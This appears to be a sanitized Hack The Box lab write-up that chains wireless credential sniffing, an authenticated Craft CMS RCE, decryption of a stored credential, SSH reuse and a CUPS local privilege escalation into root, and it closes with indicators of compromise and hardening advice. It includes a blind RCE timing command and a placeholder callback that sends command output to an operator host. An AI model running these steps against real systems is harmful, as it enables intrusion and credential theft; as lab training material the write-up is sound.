# Layover   Technical Report

> **Platform:** Hack The Box   Season 12 AERO \
> **Difficulty:** `Medium` \
> **Date:** 2026-09-28 \
> **Author:** M0THK33PR \
> **Scope:** Authorized lab environment only

---

## 0. Executive Summary

> The **Layover** machine required chaining weaknesses across several trust boundaries rather than exploiting a single exposed service. An insecure wireless segment exposed reusable application credentials, which enabled authenticated access to a vulnerable Craft CMS instance. That access was converted into command execution on the web server, where application secrets and custom source code revealed a second credential that was reusable for SSH. Local privilege-escalation enumeration then identified a vulnerable CUPS 2.4.16 installation, which was abused to obtain full system-level access. The most important remediation priorities are to protect wireless traffic, patch the vulnerable Craft CMS and CUPS components, and prevent service credentials from being reused for interactive system authentication.

---

## 1. Introduction

This report documents the structured analysis and controlled exploitation
of the **"Layover"** machine on Hack The Box.

**Objectives:**
- Obtain user-level access
- Obtain root/system-level access

**Methodology:** Assessments follow the standardized approach defined
in `methodology.md`.

> **Public-report note:** Flags, IP addresses, passwords, tokens, hashes,
> cryptographic keys, and other direct-answer values are intentionally
> omitted or replaced with placeholders.

---

## 2. Attack Chain

```text
RDP foothold → Wireless enumeration → Plaintext credential capture → Craft CMS authenticated RCE → Application secret recovery → Credential decryption/reuse → SSH → CUPS 2.4.16 LPE → Root
```

---

## 3. Tools Used

| Tool | Purpose |
|------|---------|
| `xfreerdp3` | Access to the exposed workstation |
| `iw` / NetworkManager tools | Wireless interface inspection and monitor-mode preparation |
| `airodump-ng` | Passive WLAN discovery and capture |
| `Wireshark` / `tshark` | Packet analysis and credential recovery |
| `curl` | HTTP testing, callbacks, and file transfer |
| `python3` | Archive extraction, temporary HTTP services, and helper scripts |
| Craft CMS control panel | Application enumeration and authenticated exploit path |
| `php` | Reproducing the application's credential-decryption logic |
| `ssh` | Interactive access to the portal host |
| `find` / `getcap` / `ss` | Local privilege-escalation enumeration |
| CUPS tooling / adapted PoC | Local privilege escalation |

---

## 4. Reconnaissance

### 4.1 Initial Network Scan

**Commands:**
```bash
nmap -sC -sV -oA initial <target-ip>
nmap -sC -sV -p- -oA all_ports <target-ip>
```

**Findings:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| `22/tcp` | SSH | OpenSSH | Exposed on the initial workstation |
| `3389/tcp` | RDP / xRDP | xRDP | Provided graphical access to the workstation |

**Key Observations:**
- The initial host behaved more like an airport workstation/jump host than the final target.
- The workstation contained multiple virtual wireless interfaces.
- One interface was already associated with the internal airport WLAN.
- A second wireless interface could be placed into monitor mode for passive observation.

### 4.2 Wireless Reconnaissance

Wireless inspection showed an open airport WLAN and at least one additional client station.

Sanitized example:

```text
SSID:   <wireless-network>
BSSID:  <ap-mac>
Client: <client-mac>
```

Passive packet capture was performed with the secondary interface in monitor mode.

**Key Observation:** Authentication-related application traffic was recoverable from the wireless capture.

---

## 5. Service Enumeration

### 5.1 Wireless / Web Enumeration

Packet analysis identified a second client communicating with an internal web application.

Captured traffic exposed a valid application credential:

```text
Username: <redacted>
Password: <redacted>
```

The credential was reused against an internal Craft CMS control panel and successfully authenticated.

A database backup was also recovered during enumeration. Analysis of the dump identified:

- Craft CMS 5.9.8
- Craft user records
- A custom HTB Airways settings table
- Mail-relay configuration
- An encrypted mail-relay password

Sensitive values are omitted from this report.

### 5.2 Craft CMS Enumeration

The authenticated Craft session exposed several useful administrative utilities and application details.

Relevant filesystem locations included:

```text
<craft-root>/
├── .env
├── modules/
│   └── <custom-module>/
└── storage/
```

The custom module later became important because it contained the exact application logic used to decrypt the stored mail-relay credential.

### 5.3 Additional Services

After obtaining local access to the portal host, internal service enumeration showed:

| Service | Exposure | Notes |
|---------|----------|-------|
| SSH | Network-accessible | Used for the recovered system credential |
| nginx | Network-accessible | Fronted the Craft application |
| MariaDB | Localhost only | Craft database |
| CUPS | Localhost only | Reported upstream version 2.4.16 |

The CUPS daemon became the final privilege-escalation vector.

---

## 6. Initial Access

### 6.1 Vulnerability Identification

**Vulnerability:** Authenticated Craft CMS remote code execution  
**Location:** Craft CMS element-search / condition-processing functionality  
**CVE:** `CVE-2026-44011`

**Reasoning:**

The recovered Craft account had sufficient control-panel access to reach functionality that accepted attacker-controlled condition configuration. Craft/Yii behavior configuration could be abused to instantiate a malicious behavior and invoke an attacker-controlled callback.

A timing test was used first because the vulnerable request returned an application error even when command execution succeeded.

### 6.2 Exploitation

Conceptually, the request supplied a crafted condition object that caused Yii to attach an attacker-controlled behavior. The callback was redirected to a command-execution function.

A sanitized timing test:

```bash
./blind.sh 'sleep 5'
```

The request consistently delayed by approximately five seconds.

A callback was then used to confirm the execution context:

```bash
# Listener on the operator host
python3 -m http.server <port>

# Sanitized callback
./blind.sh '<command that requests http://<operator-ip>:<port>/<whoami-output>>'
```

The callback confirmed execution as:

```text
www-data
```

**Result:** Command execution obtained as `www-data`.

---

## 7. Lateral Movement

**From:** `www-data`  
**To:** `<system-user>`

**Method:**
- Read the Craft `.env` file through the web RCE
- Recover the Craft application security key
- Exfiltrate the custom HTB Airways module
- Inspect its mail-relay password-decryption routine
- Reproduce the same Yii/Craft decryption logic locally on the target
- Recover a service credential
- Identify that the same credential was valid for SSH

### 7.1 Application Secret Recovery

The Craft environment file contained database configuration and the site security key.

Sanitized example:

```text
CRAFT_SECURITY_KEY=<redacted>
CRAFT_DB_USER=<redacted>
CRAFT_DB_PASSWORD=<redacted>
```

The custom module contained logic equivalent to:

```php
$securityKey = Craft::$app->getConfig()->getGeneral()->securityKey;

$password = Craft::$app->getSecurity()
    ->decryptByKey(
        base64_decode($encryptedPassword),
        $securityKey
    );
```

The recovered plaintext credential was intentionally not recorded in this public report.

### 7.2 Credential Reuse

The decrypted service credential was tested against SSH:

```bash
ssh <system-user>@<target-ip>
```

Authentication succeeded.

**Result:** Interactive user-level access obtained as `<system-user>`.

The user flag was recovered but is intentionally omitted.

---

## 8. Privilege Escalation

### 8.1 Local Enumeration

**Actions Performed:**
- [x] `sudo -l`
- [x] SUID binaries   `find / -perm -4000 -type f 2>/dev/null`
- [x] Cron jobs   `cat /etc/crontab`
- [x] Writable files/dirs
- [x] Capabilities   `getcap -r / 2>/dev/null`
- [x] Running processes / internal ports
- [x] Bash history / config files
- [ ] LinPEAS

**Key Findings:**
- The user had no usable `sudo` privileges.
- The SUID set contained only standard system binaries.
- No useful writable root-owned regular files were identified.
- A custom Craft cron job existed, but it executed as `www-data` and therefore did not cross a privilege boundary.
- Several apparently writable systemd paths were only symlinks to `/dev/null`.
- `snap-confine` had interesting capabilities, but no installed or seeded snaps made that route unattractive.
- A CUPS service was listening only on `127.0.0.1:631`.
- The web interface reported **CUPS 2.4.16**.
- The running `cupsd` binary was not owned by the normal Ubuntu package manager, indicating a custom/manual installation.

### 8.2 Escalation Vector

**Vector:** Local CUPS privilege escalation  
**CVE:** `CVE-2026-34990`  
**Root Cause:** Vulnerable CUPS 2.4.16 installation reachable by an unprivileged local user

The vulnerability allows a local user to abuse CUPS' local authorization mechanism and printer handling to obtain a privileged arbitrary-file write.

For this machine, the official/public exploit logic had to be adapted to the locally installed CUPS instance rather than blindly copied.

Sanitized exploitation flow:

```text
1. Interact with the local CUPS service on localhost.
2. Trigger the vulnerable local-authorization workflow.
3. Obtain the reusable local authorization context.
4. Abuse privileged printer configuration / file output.
5. Write attacker-controlled data into a root-controlled location.
6. Use the resulting primitive to obtain a root shell.
```

Exact payloads, authorization values, and target file contents are intentionally omitted.

**Result:** Root/system-level access achieved.

The root flag was recovered but is intentionally omitted.

---

## 9. Findings Summary

| # | Finding | Severity | Location |
|---|---------|----------|----------|
| 1 | Plaintext/recoverable credentials exposed over an open wireless network | 🟠 High | Airport WLAN |
| 2 | Authenticated Craft CMS RCE (`CVE-2026-44011`) | 🔴 Critical | Craft CMS 5.9.8 |
| 3 | Application security key and credentials accessible after web compromise | 🟠 High | Craft application configuration |
| 4 | Service credential reused for interactive SSH authentication | 🟠 High | Portal host |
| 5 | Vulnerable CUPS 2.4.16 local service (`CVE-2026-34990`) | 🔴 Critical | `localhost:631` |

**Severity Scale:**  
`🔴 Critical` → `🟠 High` → `🟡 Medium` → `🔵 Low` → `⚪ Info`

---

## 10. Defensive Considerations

### 10.1 Indicators of Compromise

Potential indicators generated during this attack include:

- Wireless captures showing repeated traffic from a passive monitoring station
- Successful Craft control-panel authentication from an unexpected client
- Requests to Craft element-search endpoints containing unusual serialized/class configuration
- HTTP callbacks from the Craft server to an internal workstation
- Reads of `.env` and custom application-module files by the web-service account
- Unusual outbound HTTP POST requests from `www-data`
- SSH authentication using a credential normally associated with a mail-relay/service account
- Repeated local requests to CUPS administrative/IPP endpoints from an unprivileged shell
- Unexpected printer creation or modification events
- Root-controlled files modified through CUPS-related activity

### 10.2 Security Weaknesses

- Open wireless network allowed passive observation of sensitive traffic
- Credentials were transmitted in a recoverable form
- Craft CMS was running a vulnerable version
- Web RCE exposed high-value application secrets
- A service credential was reused for interactive operating-system login
- A vulnerable manually installed CUPS daemon was reachable by local users
- Manually installed software was outside normal package-management patch visibility

### 10.3 Hardening Recommendations

| Priority | Recommendation | Finding |
|----------|---------------|---------|
| Immediate | Patch or upgrade Craft CMS to a version not affected by `CVE-2026-44011` | #2 |
| Immediate | Remove or patch the vulnerable CUPS 2.4.16 installation | #5 |
| Immediate | Rotate all credentials and cryptographic secrets exposed to the Craft application | #3 |
| Immediate | Disable SSH login for service-only identities and eliminate credential reuse | #4 |
| Short-term | Enforce encrypted wireless access such as WPA2/WPA3-Enterprise | #1 |
| Short-term | Require TLS for all authenticated internal web traffic | #1 |
| Short-term | Restrict Craft control-panel access and review account privileges | #2 |
| Long-term | Bring manually installed services under centralized inventory and patch management | #5 |
| Long-term | Separate application, service, and interactive-user credentials | #3 / #4 |

---

## 11. Lessons Learned

- **Wireless interfaces are part of the attack surface.** The useful path did not start with another conventional port scan; inspecting the workstation's virtual radios exposed an entirely different network perspective.
- **A failing HTTP response does not mean an exploit failed.** The Craft endpoint returned errors while still executing the injected behavior, so timing and callbacks were much better proof than the HTTP status code.
- **Application source code can be as valuable as secrets.** The encrypted database value alone was not enough. The custom module revealed exactly how Craft derived and used the key required to decrypt it.
- **Credential reuse turned application compromise into host compromise.** A mail-relay credential should never have doubled as an interactive SSH password.
- **Privilege escalation enumeration needs elimination, not just discovery.** The custom cron job, capability-bearing binaries, and apparently writable systemd paths all looked interesting at first, but none crossed the necessary privilege boundary.
- **Package version checks can be misleading when software is installed manually.** Ubuntu's packaged CUPS libraries were patched, while the running daemon was a separate upstream 2.4.16 installation. Verifying the actual executing binary mattered.
- **Use published PoCs as references, not magic commands.** The final CUPS route required understanding the vulnerable mechanism and adapting the exploit to the machine rather than treating a PoC as a black box.

---

*End of Report*  
*Classification: Public   flags and sensitive values omitted*
